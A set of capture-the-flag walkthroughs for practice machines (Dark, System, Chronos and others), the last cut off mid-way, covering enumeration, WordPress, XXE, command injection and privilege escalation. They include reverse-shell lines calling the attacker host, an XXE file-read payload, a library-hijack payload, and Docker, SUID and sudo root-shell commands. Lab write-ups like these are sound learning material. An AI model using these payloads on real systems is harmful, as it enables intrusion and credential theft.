title: Dark - Walkthrough
content:
Overview# Attacker IP: 10.200.74.40 Target Machine IP: 10.1.113.43 The objective was to enumerate the target, identify exposed services, gain initial access by exploiting an unauthenticated WordPress privilege escalation vulnerability (CVE-2026-23550), and escalate privileges to root through Docker group membership.
Port Scanning# RustScan# The first step was identifying the exposed services running on the target.
rustscan -a 10.1.113.43 -- -A -oN nmap/rustResults# 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 80/tcp open http Apache 2.4.52 WordPress 6.0Only two services were exposed:
SSH on port 22 Apache HTTP Server on port 80 hosting a WordPress 6.0 website With such a small attack surface, the next step was to enumerate the web application.
Enumeration# HTTP Enumeration# Browsing to the website presented a very simple WordPress page containing only a quote.
Nothing interesting was exposed on the homepage, and reviewing the page source did not reveal any hidden comments, JavaScript files, or credentials.
robots.txt# Checking robots.txt revealed the standard WordPress administrative paths.
Disallow: /wp-admin/ Allow: /wp-admin/admin-ajax.php Sitemap: http://10.1.113.43/wp-sitemap.xml
WordPress Login Page# The WordPress login page was available at /wp-admin.
To determine whether the common admin username existed, I submitted a login request using a dummy password. WordPress responded with an Unknown username error, confirming that no account named admin existed.
Since the login page did not disclose a valid username, I continued enumerating the application instead of attempting further guesses.
Directory Enumeration# Before running WPScan, I performed some basic directory enumeration.
gobuster dir \ -u http://10.1.113.43 \ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txtWhile enumerating the site, I visited the default WordPress post located at:
http://10.1.113.43/hello-worldThe author information exposed the administrator username:
streetcoderadmin
Having the administrator username would become useful if authentication was ever required.
WordPress Enumeration# Since the target was running WordPress, I used WPScan to enumerate installed plugins and identify any publicly known vulnerabilities.
wpscan \ --url http://10.1.113.43/ \ --api-token [TOKEN] \ -e p \ --plugins-detection mixedWPScan detected the Modular Connector plugin and reported two known vulnerabilities affecting the installed version.
Plugin: Modular Connector CVE-2026-23550 Unauthenticated Privilege Escalation CVE-2026-3903 Cross-Site Request Forgery (CSRF)
The most critical finding was CVE-2026-23550, an unauthenticated privilege escalation vulnerability that allows an attacker to obtain administrative access without valid credentials.
WPScan linked to the following advisory, which includes a proof of concept:
https://wpscan.com/vulnerability/3ccaa0fd-b11c-4f9f-bab5-644a53b11035/ The advisory described the vulnerable endpoint:
/api/modular-connector/login/d?origin=mo&type=cAfter adapting the request to the target, I was successfully authenticated as the WordPress administrator without knowing the account password.
Username: streetcoderadmin
With administrator access to the WordPress dashboard, the next objective was achieving remote code execution.
Initial Access# Plugin Upload# Now that I had administrator privileges, the obvious goal was remote code execution.
My first idea was to modify the active theme through the built-in Theme Editor. However, every modification was sanitized when saving the file, preventing code execution.
Instead, I decided to upload a malicious plugin.
The first plugin I found was:
https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin
However, uploading it failed with:
The uploaded file exceeds the upload_max_filesize directive in php.ini.Since the plugin archive was too large, I searched for a smaller alternative.
The next plugin I found was:
https://github.com/Bhanunamikaze/Wordpress_ReverseShell
I downloaded the PHP file and created my own ZIP archive.
wget https://github.com/bhanunamikaze/Wordpress_ReverseShell/raw/main/system-health-monitor.php mkdir system-health-monitor cp system-health-monitor.php system-health-monitor/ zip -r system-health-monitor.zip system-health-monitor/The upload completed successfully.
After activation, a new Health Monitor menu appeared inside the WordPress dashboard.
The plugin only required specifying:
Attacker IP Listening Port Connection Method Once configured, it immediately connected back to my listener.
I stabilized the shell with:
script -q /dev/null bash -i
Privilege Escalation# Docker Group# After obtaining a shell, the first step was checking the current user’s group memberships.
groupsThe output showed that the www-data user was a member of the docker group.
Membership in the Docker group grants the ability to create and manage containers. Since Docker containers can be started with the host filesystem mounted, this permission can be abused to access the host system with root privileges.
This provided a direct path to privilege escalation.
Root via Docker# I launched an Alpine container while mounting the host root filesystem.
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/shThe command immediately dropped me into a root shell on the host system.
From there I located user flag
find / -name user.txt 2>/dev/null
Post-Exploitation Cleanup# After completing the exploitation process and collecting the required information, I removed the files and plugins used during testing to clean up the artifacts created during the assessment.
I navigated to the WordPress plugins directory and reviewed the installed plugins.
cd /var/www/172_16_1_84_/public/wp-content/plugins ls -la
The reverse shell plugin used during exploitation was removed to prevent leaving unnecessary artifacts on the target system.
Credentials# WordPress Administrator ----------------------- Username: streetcoderadmin Password: Obtained via CVE-2026-23550 Flags# user:flag{w0redPress-2026-23550} root:flag{docker-is-fun-0385}

title: Noob - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.37 The objective was to enumerate the target, identify exposed services, gain initial access by recovering an exposed SSH private key from the web server, and escalate privileges by abusing the web server’s ability to access files through symbolic links.
Port Scanning# RustScan# rustscan -a 10.10.10.37 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 65530/tcp open http Golang net/http serverOnly two services were exposed:
SSH on port 22 A Golang HTTP server on port 65530 With a very small attack surface, the web service became the primary focus.
Enumeration# HTTP# Browsing to the web service returned only a simple 404 page with no additional information.
I also checked for a robots.txt file, but none existed.
Directory Enumeration# Since the default page was unhelpful, I performed directory brute forcing.
ffuf -u http://10.10.10.37:65530/FUZZ \ -w /usr/share/seclists/Discovery/Web-Content/common.txtThe scan revealed an index page.
/index
Opening the page displayed only a short message.
Hi, You are close!
Continuing the enumeration revealed another interesting directory.
/nt4share
Exposed SSH Key# Inside /nt4share, I found an SSH private key (id_rsa).
The corresponding public key was also available.
Inspecting the public key revealed the username:
adela Initial Access# Using the recovered private key, I authenticated through SSH.
chmod 600 id_rsa ssh -i id_rsa adela@10.10.10.37The login was successful.
Privilege Escalation# Enumeration# The first step was checking for common privilege escalation vectors.
I attempted to check sudo permissions.
sudo -lHowever, sudo was not installed.
I also checked for doas, but it was unavailable.
Next, I searched for Linux capabilities.
getcap -r / 2>/dev/nullNo interesting capabilities were found.
Finally, I searched for SUID binaries.
find / -perm -4000 -type f 2>/dev/nullNothing useful was present.
Reading Root Files via Symlink# Since the traditional privilege escalation vectors failed, I considered the behavior of the Golang web server.
If the web service was running as root, it might follow symbolic links and expose files outside of its intended directory.
I created a symbolic link pointing to /root.
ln -s /root rootRequesting the linked directory through the web server exposed the contents of /root.
Among the files was the root user’s SSH private key.
After downloading the key, I authenticated directly as root.
chmod 600 root_id_rsa ssh -i root_id_rsa root@10.10.10.37The login succeeded, resulting in full system compromise.
Credentials# adela:<SSH private key> root:<SSH private key> Flags# user:HMVVCXUIUHFDSUIYREWDS432 root:HMVA97DSA8732HJGDSA78623

title: Observer - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.36 The objective was to enumerate the target, identify exposed services, gain initial access through the vulnerable HTTP file observer service, and escalate privileges through exposed credentials and sudo permissions.
Port Scanning# RustScan# rustscan -a 10.10.10.36 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0) 3333/tcp open http syn-ack Golang net/http serverThe scan revealed two exposed services:
SSH running on port 22 A custom Golang HTTP server running on port 3333 The web service looked unusual, so further enumeration was performed.
Enumeration# HTTP Service# Accessing the service on port 3333 returned:
OBSERVING FILE: /home/ NOT EXIST <!-- OxKmRNwKDOUnXzmDikdJPukQLaxAHzHMV -->The response suggested that the application was attempting to access files inside the filesystem.
The server appeared to be observing arbitrary file paths, so I attempted to discover readable files.
This section is already structured well. I would only make a few wording fixes to improve flow and avoid repeating the SSH discovery twice:
File Enumeration# Since the application appeared to check file existence, I attempted to brute force common sensitive files such as:
.bashrc .ssh/id_rsa .bash_historyUsing a users wordlist from SecLists, I discovered a valid user:
jan
Further enumeration revealed that the user’s SSH private key was accessible:
/home/jan/.ssh/id_rsa
After recovering the private key, I used it to authenticate as jan through SSH.
Initial Access# Using the recovered SSH key:
ssh -i id_rsa jan@10.10.10.36SSH access was successful.
Privilege Escalation# jan → root# The first step after gaining access was checking sudo permissions.
sudo -l
The user was allowed to execute:
/usr/bin/systemctl -l statusas any user without a password.
Although systemctl status can sometimes be abused for privilege escalation through its pager functionality, I was unable to leverage it in this environment. Further enumeration was required to find another privilege escalation path.
Manual Enumeration# I continued with manual enumeration.
Inside /opt, I found a file named:
/opt/observer
The file did not reveal anything immediately useful.
Abusing the File Observer# Because the HTTP service appeared to read files relative to paths, I tested whether symbolic links could expose protected directories.
Inside the home directory:
ln -sf /root rootThis created a symbolic link pointing to /root.
After creating the link, the file observer could access files inside the root directory.
I attempted to retrieve:
/root/.ssh/id_rsabut the SSH key was not accessible.
However, the root flag was readable.
Recovering Root Credentials# I continued checking user files and inspected bash history.
cat ~/.bash_historyThe history contained a suspicious string:
fuck1ng0bs3rv3rs
This appeared to be a password.
Using it with the root account:
su rootworked successfully.
Credentials# root:fuck1ng0bs3rv3rs Flags# user:HMVdDepYxsi8VSucdruB3P7 root:HMVb6MPDxdYLLC3sxNLIOH1

title: Baseme - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.34 The objective was to enumerate the target, identify exposed services, gain initial access by abusing Base64-encoded resources, and escalate privileges through a misconfigured sudo rule allowing access to sensitive files.
Port Scanning# RustScan# rustscan -a 10.10.10.34 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 80/tcp open http nginx 1.14.2The scan revealed two exposed services:
SSH on port 22 HTTP on port 80 The web application was the obvious starting point.
Enumeration# Web Enumeration# Visiting the web page displayed what appeared to be a Base64-encoded string.
Inspecting the page source revealed the following HTML comment:
<!-- iloveyou youloveyou shelovesyou helovesyou weloveyou theyhatesme -->
Decoding the Base64 string displayed on the page revealed the following message:
ALL, absolutely ALL that you need is in BASE64. Including the password that you need :) Remember, BASE64 has the answer to all your questions. -lucasThe message introduced the username lucas and strongly hinted that everything required to solve the machine was Base64 encoded.
At this point, I attempted to authenticate over SSH using the words from the HTML comment as the password, including Base64-encoded variations, but none were successful.
Directory Enumeration# Since the hint repeatedly referenced Base64, I generated a Base64-encoded wordlist from SecLists and used it for directory brute forcing.
First, I generated a list from the medium DirBuster wordlist:
for i in $(cat /opt/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt); do echo "$i" | base64 done > misc/dir_medium_64Unfortunately, this did not reveal anything useful.
Next, I generated a Base64 version of the common wordlist:
for i in $(cat /opt/wordlists/seclists/Discovery/Web-Content/common.txt); do echo "$i" | base64 done > misc/common_64This time, two interesting paths were discovered:
aWRfcnNhCg== cm9ib3RzLnR4dAo=
Recovering the SSH Key# Requesting the first path returned a very large Base64 blob.
curl -s http://10.10.10.34/aWRfcnNhCg==
After decoding it, the content was identified as an SSH private key.
The second path did not return any useful data.
Since the earlier message mentioned the user lucas, I attempted to authenticate using the recovered key.
SSH accepted the key but requested its passphrase.
Initial Access# Initially, I attempted to crack the passphrase using RockYou:
ssh2john creds/ssh_web > misc/ssh_hash john --wordlist=~/wordlists/rockyou.txt misc/ssh_hashSince the machine revolved around Base64, I instead generated a Base64-encoded version of the RockYou wordlist.
for i in $(cat ~/wordlists/rockyou-50.txt); do echo "$i" | base64 done > misc/rock_64 john --wordlist=misc/rock_64 misc/ssh_hash
The recovered passphrase successfully unlocked the private key.
Using the decrypted key, I authenticated as lucas.
Privilege Escalation# lucas → root# The first thing I checked was the user’s sudo permissions.
sudo -l
The user could execute:
/usr/bin/base64as any user without supplying a password.
Although base64 cannot execute commands directly, it can read files that the invoking user normally cannot access.
I used it to read root’s private SSH key:
sudo -u root /usr/bin/base64 /root/.ssh/id_rsa
After copying the output and decoding it locally, the root private key was recovered.
Using the recovered key, I authenticated directly as root.
Root access was obtained.
Credentials# User: lucas SSH Private Key: aWxvdmV5b3UK Flags# user:HMV8nnJAJAJA root:HMVFKBS64

title: System - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.35 The objective was to enumerate the target, identify exposed services, gain initial access by exploiting an XXE vulnerability to recover SSH credentials, and escalate privileges through Python library hijacking.
Port Scanning# RustScan# rustscan -a 10.10.10.35 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 80/tcp open http nginx 1.18.0Only SSH and an Nginx web server were exposed, making the web application the obvious starting point.
Enumeration# Web Enumeration# Browsing to the website presented a registration page.
Submitting the registration form did not appear to perform any useful action.
Inspecting the page source revealed a JavaScript function that generated an XML document and submitted it to magic.php.
function XMLFunction() { var xml = "" + '<?xml version="1.0" encoding="UTF-8"?>' + "<details>" + "<email>" + $("#email").val() + "</email>" + "<password>" + $("#password").val() + "</password>" + "</details>"; xmlhttp.open("POST", "magic.php", true); xmlhttp.send(xml); }
Since user-controlled XML was being processed by the server, the application appeared to be a good candidate for XXE testing.
XXE# The following payload was submitted:
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <details> <email>&xxe;</email> <password>void</password> </details>The response successfully returned the contents of /etc/passwd, confirming the XXE vulnerability.
From the output, the user david was identified.
Reading Sensitive Files# I first attempted to recover David’s SSH private key using the XXE vulnerability.
/home/david/.ssh/id_rsaThe file was successfully read.
Although the private key was successfully recovered, it turned out to be a rabbit hole. SSH authentication with the key failed, so I continued searching for other sensitive files.
Further enumeration was required.
Using wfuzz, I searched for additional interesting files within David’s home directory.
wfuzz \ -w /opt/wordlists/seclists/Discovery/Web-Content/quickhits.txt \ -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE results [<!ENTITY test SYSTEM "file:///home/david/FUZZ">]><details><email>&test;</email><password>pass</password></details>' \ --hh 85 \ http://10.10.10.35/magic.phpThe scan revealed several interesting files, including .viminfo.
Inspecting .viminfo revealed that David had previously opened:
/usr/local/etc/mypass.txt
Reading that file through XXE returned what appeared to be David’s password written in leetspeak.
Initial Access# Using the recovered credentials:
Username: david Password: h4ck3rd4v!dSSH authentication was successful.
Privilege Escalation# david → root# The first step was checking for common privilege escalation vectors.
sudo -l which doasNeither sudo nor doas was available.
I also checked for Linux capabilities.
getcap -r / 2>/dev/nullNo useful capabilities were found.
Finally, I searched for SUID binaries.
find / -perm -4000 -type f 2>/dev/nullNothing interesting appeared.
Python Library Hijacking# While enumerating /opt, I discovered an interesting script.
The script imported Python’s os module while running with elevated privileges.
Since it relied on the os module, I checked whether the corresponding os.py file was writable.
find / -type f -name os.py -ls 2>/dev/nullThe os.py module used by the script was writable by all users, making Python library hijacking possible.
Initially, I inserted a payload at the beginning of the file to create a SUID shell and later attempted a reverse shell, but neither executed successfully.
After appending the payload to the end of the module instead, it executed when the privileged script imported the library.
def nvru(): import subprocess subprocess.run(["nc","-e","/bin/bash","10.10.10.2","9001"]) nvru()Executing the vulnerable script resulted in a SUID-enabled /bin/bash, allowing root access.
Credentials# david:h4ck3rd4v!d Flags# user:79f3964a3a0f1a050761017111efffe0 root:3aa26937ecfcc6f2ba466c14c89b92c4

title: Hostname - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.33 The objective was to enumerate the target, identify exposed services, gain initial access through information disclosed in the web application, and escalate privileges by abusing a vulnerable tar backup cron job.
Port Scanning# RustScan# rustscan -a 10.10.10.33 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 80/tcp open http nginx 1.18.0The scan revealed two services:
SSH on port 22 HTTP (nginx) on port 80 The web application was the obvious starting point.
Enumeration# Web Enumeration# Browsing the website presented a simple page asking for a secret.
Inspecting the page source revealed two interesting pieces of information:
Username: po Base64 string: S3VuZ19GdV9QNG5kYQ==
Decoding the Base64 string produced:
Kung_Fu_P4nda
Since SSH was exposed, I first attempted to authenticate using these values, but the login failed.
Hidden Parameter# After reviewing the source code again, I discovered a hidden parameter named secret.
Sending a POST request with the recovered values produced the following JavaScript alert:
curl -s http://10.10.10.33/ \ -d "secret=Kung_Fu_P4nda&username=po"Response:
<script type="text/javascript"> alert("!ts-bl4nk"); </script>
The alert revealed another password:
!ts-bl4nk Initial Access# SSH access was obtained using:
Username: po Password: !ts-bl4nkUsing these credentials, I successfully authenticated over SSH.
Privilege Escalation# po → oogway# The first check was the user’s sudo permissions.
sudo -l
The user had no direct sudo permissions.
While enumerating the system, I checked /etc/sudoers.d/ and noticed that the current user could read the configuration files.
ls -l /etc/sudoers.d cat /etc/sudoers.d/po
The configuration allowed the user po to execute Bash as oogway, provided the hostname was HackMyVm.
The following command successfully spawned a shell as oogway:
sudo -h HackMyVm -u oogway /bin/bash
oogway → root# As oogway, I checked sudo permissions again, but the account required a password that was not known.
During enumeration, I discovered the directory /opt/secret.
ls -la /opt/secretThe directory was empty, but the user had read, write, and execute permissions.
This suggested it might be used by an automated process.
Checking the system cron jobs confirmed that a cron task executed every second and archived the contents of /opt/secret using tar with a wildcard (*).
Since the backup used a wildcard, it was vulnerable to the classic GNU tar wildcard injection technique.
Reference:
https://dev.to/devon_argent_f9a11303298a/day-12-auditing-linux-privilege-escalation-vectors-gm3 I placed the required payload files inside /opt/secret to exploit the wildcard injection. When the cron job executed, it copied /bin/bash to /tmp/shell and set the SUID bit on the copied binary.
After the cron job ran, the SUID binary was successfully created.
Executing the SUID binary with the -p option spawned a root shell.
/tmp/shell -p
Credentials# Web: secret=Kung_Fu_P4nda username=po SSH: po:!ts-bl4nk Flags# user:081ecc5e6dd6ba0d150fc4bc0e62ec50 root:d5806296126a30ceebeaa172ff9c9151

title: IoT - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.30 The objective was to enumerate the target, identify exposed services, gain initial access through leaked MQTT credentials, and escalate privileges through Linux capabilities.
Port Scanning# RustScan# rustscan -a 10.10.10.30 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0) 1883/tcp open mosquitto syn-ack Mosquitto version 2.0.21 | mqtt-subscribe: | Topics and their most recent payloads: | $SYS/broker/load/bytes/received/15min: 4.57 | $SYS/broker/clients/maximum: 9 | ssh/login: redteam:Pentest123!The scan revealed two exposed services:
SSH running on port 22 MQTT broker running on port 1883 The MQTT service was the most interesting target because Nmap enumeration revealed available broker information.
Enumeration# MQTT - Mosquitto# The MQTT broker was running on port 1883.
Nmap’s MQTT script revealed several broker details, including retained messages and active topics.
Important output:
ssh/login: redteam:Pentest123!The MQTT broker exposed SSH credentials:
Username: redteam Password: Pentest123!These credentials could potentially be used for SSH access.
Initial Access# Using the recovered credentials:
Username: redteam Password: Pentest123!SSH access was successful.
ssh redteam@10.10.10.30
Successfully logged into the machine as redteam.
Privilege Escalation# redteam → root# After gaining access, I started local enumeration.
The first check was sudo permissions:
sudo -l
The user did not have any sudo privileges.
You can replace that section with this corrected wording:
I also checked whether doas was installed on the machine:
which doas
The doas binary was not available on the system, so there was no doas configuration to abuse.
Checking User Information# I checked the user’s groups:
groupsNo useful group memberships were found.
The home directory did not contain any useful information, and the bash history was empty.
Linux Capabilities Abuse# Since sudo and other common escalation methods were unavailable, I checked for binaries with special capabilities.
Command used:
getcap -r / 2>/dev/nullA vulnerable capability was discovered:
/usr/bin/ruby3.3 cap_setuid+epThe Ruby binary had the cap_setuid capability, allowing it to change its UID to 0 (root).
Reference:
https://gtfobins.org/gtfobins/ruby/#shell Using the GTFOBins Ruby capability abuse technique:
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'The command successfully spawned a root shell.
Root access was obtained.
Credentials# redteam:Pentest123! Flags# user:4a8e67f8bb252d0b4feab103b8d58f553644f39d33314beff8b9214879451de1 root:cb0f023463e47a76f9d69e0b435a10882b6dd7489c5ca4d4b6ccac9c631a46d8

title: ColddBox - Walkthrough
content:
Overview# Attacker IP: 10.245.58.142 Target Machine IP: 10.245.58.242 The objective was to enumerate the target, gain initial access by compromising a vulnerable WordPress installation, and escalate privileges by abusing a misconfigured SUID binary.
Enumeration# Port Scanning# RustScan# rustscan -a 10.245.58.242Output:
Open 10.245.58.242:80 Open 10.245.58.242:4512Nmap# sudo nmap -sSCV -A -p80,4512 -oN nmap/ports 10.245.58.242Results:
PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 (Ubuntu) 4512/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 HTTP Title: ColddBox | One more machine WordPress 4.1.31Only two TCP ports were exposed: HTTP on port 80 and SSH on port 4512.
WordPress Enumeration# Browsing to the website revealed a standard WordPress installation with nothing immediately interesting.
After performing directory brute forcing, I discovered a hidden directory:
hidden/Visiting the directory displayed a short message containing three names that looked like potential usernames:
C0ldd Philib HugoThese names appeared to be useful for further WordPress enumeration, so I proceeded to verify whether they were valid users.
User Enumeration# Using WPScan, valid usernames were identified.
philip C0lddThe administrator account (C0ldd) was then targeted with a password brute-force attack.
wpscan --url http://10.245.58.242 \ -P ~/wordlists/rockyou.txt \ -U creds/usersSuccessful credentials:
C0ldd : 9876543210 C0ldd : iluvrichThe password 9876543210 successfully authenticated to the WordPress admin panel.
Initial Access# After logging into the WordPress dashboard as C0ldd, I uploaded the PentestMonkey PHP reverse shell by modifying a theme file.
Triggering the modified page executed the payload and provided a shell as www-data.
Privilege Escalation# Enumerating WordPress# The first file inspected was the WordPress configuration.
cat wp-config.phpDatabase credentials were recovered.
Since MySQL was running locally, I connected using the recovered credentials and extracted the WordPress user hashes.
c0ldd:$P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1 hugo:$P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/ philip:$P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y.After cracking the hashes with John the Ripper:
c0ldd : 9876543210 hugo : password123456Although additional credentials were recovered, they did not lead to privilege escalation.
Abusing a SUID Binary# Continuing local enumeration, I searched for SUID binaries.
find / -type f -perm -4000 -ls 2>/dev/nullAmong the results was an unusual entry:
/usr/bin/findThe find binary had the SUID bit set.
According to GTFOBins, find can be abused to execute commands with elevated privileges when it has the SUID permission.
Running:
/usr/bin/find . -exec /bin/sh -p \; -quitspawned a root shell.
Credentials# WordPress C0ldd:9876543210 Recovered hugo:password123456 Flags# User# RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==Decoded:
Felicidades, primer nivel conseguido!Root# wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=Decoded:
¡Felicidades, máquina completada!

title: Who Wants to Be King? 1 - Walkthrough
content:
Overview# Attacker IP: 10.245.58.142 Target Machine IP: 10.245.58.27 The objective was to enumerate the target, identify exposed services, gain initial access by recovering credentials from an exposed binary, and escalate privileges by discovering the root password through user artifacts.
Enumeration# Port Scanning# RustScan# rustscan -a 10.245.58.27Output:
Open 10.245.58.27:22 Open 10.245.58.27:80Nmap# sudo nmap -sSCV 10.245.58.27 -A -p22,80 -oN nmap/portsResults:
PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 80/tcp open http Apache httpd 2.4.41 http-title: Index of / http-server-header: Apache/2.4.41 (Ubuntu) Index of / 31K skeyloggerOnly SSH and HTTP were exposed. The web server had directory listing enabled and exposed a single file named skeylogger, making it the obvious target for further enumeration.
Analyzing the Exposed Binary# The binary was downloaded for offline analysis.
wget http://10.245.58.27/skeyloggerChecking the file type:
file skeyloggerOutput:
skeylogger: ELF 64-bit LSB pie executable, x86-64, dynamically linked, with debug_info, not strippedSince the binary contained debug symbols, extracting printable strings was the next step.
strings -n 10 skeyloggerAmong the output was a Base64-encoded string:
ZHJhY2FyeXMKDecoding it:
echo "ZHJhY2FyeXMK" | base64 -dOutput:
dracarysThe decoded string looked like a password. From the VM login screen, the username daenerys was already known, making SSH the next thing to try.
Initial Access# Using the recovered credentials:
Username: daenerys Password: dracarysSSH authentication succeeded.
Privilege Escalation# Inspecting User Files# After gaining access as daenerys, I started the usual post-exploitation enumeration.
One of the first files inspected was the shell history.
cat ~/.bash_historyThe history referenced files inside the user’s .local/share directory.
Inside the directory was a ZIP archive.
After extracting it, I found a note.txt file containing only part of a message.
The remaining directories did not reveal anything useful, so I searched online for the missing part of the note.
Recovering the Root Password# The incomplete message referenced a Game of Thrones character. Searching for the text revealed the missing name:
Khal DrogoThis suggested the password:
khaldrogo
Looking back at .bash_history, I noticed the user had switched to root immediately after reading the note. That strongly suggested the recovered password belonged to the root account.
Using su:
su -Password:
khaldrogoThe password was correct, resulting in a root shell.
Credentials# daenerys:dracarys root:khaldrogo

title: Chronos - Walkthrough
content:
Chronos - Walkthrough# Overview# Attacker IP: 10.151.249.142 Target Machine IP: 10.151.249.111 The objective was to enumerate the target, identify exposed services, gain initial access through a command injection vulnerability, and escalate privileges by exploiting a vulnerable express-fileupload application running on an internal service.
Port Scanning# RustScan# rustscan -a 10.151.249.111Results# Open 10.151.249.111:22 Open 10.151.249.111:80 Open 10.151.249.111:8000To gather additional information, I performed a full Nmap scan.
sudo nmap -sSCV -A -p22,80,3306,8080 -oN nmap/ports 10.151.249.111Nmap Output# Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-26 00:07 +0200 Nmap scan report for 10.151.249.111 Host is up (0.00030s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 3306/tcp closed mysql 8080/tcp closed http-proxy Service Info: OS: LinuxOnly SSH and Apache were publicly accessible, so web enumeration became the next step.
Enumeration# Apache Web Server# Browsing to the web server initially displayed a simple page showing only the text “Chronos” in a custom font.
Viewing the page source revealed an interesting virtual host:
chrono.localAfter adding the hostname to my /etc/hosts file, the website changed and loaded the actual application. This page displayed the current date and time.
Inspecting the browser’s Developer Tools showed that the application retrieved the time using the following endpoint:
/date?format=base58The format parameter immediately stood out because its value appeared to be passed directly to the backend without proper validation, making it a good candidate for command injection testing.
Command Injection# To verify my suspicion, I began testing the format parameter with simple command injection payloads. The application executed the supplied commands, confirming the vulnerability.
After confirming code execution, I attempted to obtain a reverse shell. A standard Netcat payload failed, likely because the target’s version of nc did not support the required options.
I then switched to the classic mkfifo reverse shell payload.
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.151.249.142 9001 >/tmp/fThis payload successfully connected back to my listener and provided a shell as the www-data user.
Privilege Escalation# www-data → imera# Checking sudo permissions showed that www-data had no useful privileges.
While enumerating the system, I noticed a service listening only on localhost.
127.0.0.1:8080I forwarded the port to my attacking machine using socat.
After opening the forwarded port in the browser, the page simply displayed:
Coming Soon...
Searching the filesystem for this string quickly located the application’s source code.
grep -R "Coming Soon" /opt
The search pointed to an index.js file.
Inspecting it revealed the application was using the vulnerable express-fileupload package.
Searching for public exploits led to a known exploit for this vulnerable version.
Executing the exploit successfully provided a shell as imera.
Stabilizing the Shell# To obtain a fully interactive shell, I upgraded the TTY.
python3 -c "import pty; pty.spawn('/bin/bash')"After backgrounding the shell:
stty raw -echo; fg export TERM=xtermTo maintain persistent access, I added my public SSH key.
mkdir ~/.ssh vi ~/.ssh/authorized_keysI was then able to connect directly through SSH.
imera → root# After obtaining access as imera, I checked the user’s sudo permissions.
sudo -lThe output showed that imera could execute both node and npm as root without requiring a password.
(ALL) NOPASSWD: /usr/local/bin/npm * (ALL) NOPASSWD: /usr/local/bin/node *Since node can execute arbitrary JavaScript code, this effectively allows arbitrary command execution as the root user.
A root shell can be spawned directly using Node’s child_process module:
sudo /usr/local/bin/node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
Executing the command immediately spawned a root shell, completing the privilege escalation.
Flags# user.txt byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK Decoded: o chronos pernaei file mouroot.txt YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK Decoded: apopse siopi mazeuoume oneira

title: p4l4nc4 (Palanca) - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.27 The objective was to enumerate the target, identify exposed services, gain initial access through a Local File Inclusion (LFI) vulnerability, and escalate privileges by abusing insecure permissions on /etc/passwd.
Port Scanning# RustScan# rustscan -a 10.10.10.27 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 80/tcp open http Apache httpd 2.4.62 ((Debian))Only SSH and an Apache web server were exposed, making the web service the obvious starting point.
Enumeration# HTTP Enumeration# Browsing the web server revealed only the default Apache Debian page.
The page source did not contain anything interesting.
Checking robots.txt revealed a long Portuguese text, but nothing immediately useful.
Directory Enumeration# Since the default page did not reveal anything useful, I started directory brute forcing.
gobuster dir \ -u http://10.10.10.27/ \ -w /opt/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \ -x html,php,js,txt,sql,xmlNo interesting files or directories were discovered.
Because the text inside robots.txt looked unusual, I generated a custom wordlist using CeWL.
cewl -m 5 http://10.10.10.27/robots.txt > misc/wordlist gobuster dir \ -u http://10.10.10.27/ \ -w misc/wordlist \ -x html,php,js,txt,sql,xmlThis also failed to discover anything.
I then suspected the hidden content might be encoded using leetspeak. CyberChef did not produce useful results, so I manually converted the words using sed.
cat misc/wordlist \ | sed 's/a/4/g' \ | sed 's/e/3/g' \ | sed 's/i/1/g' \ | sed 's/l/1/g' \ | sed 's/o/0/g' \ | sed 's/s/5/g' \ | sed 's/t/7/g' \ | sort | uniq | tr A-Z a-z \ > misc/wordlist_leet_lowerUsing the new wordlist revealed a hidden directory.
